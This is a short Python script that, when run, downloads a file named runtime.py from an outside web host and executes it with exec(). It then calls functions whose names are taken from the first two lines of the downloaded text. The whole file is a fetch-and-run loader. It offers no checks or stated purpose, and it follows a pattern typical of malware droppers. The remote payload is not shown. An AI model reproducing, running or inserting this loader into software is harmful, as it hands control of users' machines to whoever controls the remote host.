import sys
import types
import requests

def execute():
    url = "http://public.publicshare.org/python/runtime.py"
    module_name = "runtime"

    response = requests.get(url)
    source = response.text

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    source_lines = source.split('\n')
    modified_source = '\n'.join(source_lines[2:-2])

    exec(modified_source, module.__dict__)

    try:
        getattr(module, source_lines[0].strip())()
        getattr(module, source_lines[1].strip())()
    except Exception as e:
        print(e)

execute()
